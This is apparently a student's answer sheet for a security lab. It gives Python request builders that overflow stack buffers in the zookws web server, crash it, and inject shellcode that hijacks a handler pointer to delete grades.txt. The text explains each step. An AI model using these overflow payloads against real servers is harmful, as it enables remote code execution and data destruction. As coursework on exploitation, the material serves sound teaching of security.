## Place your answers here.

---------------------------------Exercise--2 ------------------------------------------------------------------

[exploit-2a.py]
	
	Added Code:

		stack_buffer = 0x804963d

	    handler_safety = struct.pack("<I", stack_buffer);
	    req =   "GET /" + "A"*1008+handler_safety +"A"*12+ " HTTP/1.0\r\n" + \
		    "\r\n"
		return req

	Overwriting a return address on the stack:

		zookfs.c calls the function http_serve(), an overflow can happen to the pn, if the sizeof(pn+name) before excuting the line 274 exceeds 1024.Handler is overwritten and as well as the return address. To prevent over-writing handler, we actually replace the earlier address(which was got while debugging using gdb) so that handler is not overwritten.


[exploit-2b.py]

	Added Code:

		req =   "GET /" + "A"*5050+ " HTTP/1.0\r\n" + \
            	"\r\n"
		return req
	
	Overwriting some Data Structure:

		process_client() function of zookd.c calls the function http_request_line().The pointer envp can be made to access a bad location when buf overflows(sizeof(buf) > 4096). This makes it to be vulnerable to a server-crash due to a segmentation fault.

----------------------------------Exercise--3 ------------------------------------------------------------------


[exploit-3.py]

	Added Code:

		stack_buffer = 0x804d0b4

		handler_shellcode = struct.pack("<I", stack_buffer+1);
	    req =   "GET /" +urllib.quote(shellcode) +"A"*948+handler_shellcode+ " HTTP/1.0\r\n" + \
		    "\r\n"
		return req

	Constructing an exploit that hijacks control flow of the web server and unlinks /home/httpd/grades.txt :

		In shellcode.S, SYS_execve is changed to SYS_unlink and STRING is changed to "/home/httpd/grades.txt".
		Here, we do the exploit similar to the part-a of Exercise-2.
		zookfs.c calls the function http_serve(), an overflow can happen to the pn, if the sizeof(pn+name) before excuting the line 274 exceeds 1024. 
		We inject the shellcode in the request, so pn starts with the shellcode, as we know the address of pn(got while debugging using gdb), we overwrite the handler ptr to start at the shellcode.Now that the handler is overwritten with the shellcode the file 'grades.txt' gets deleted.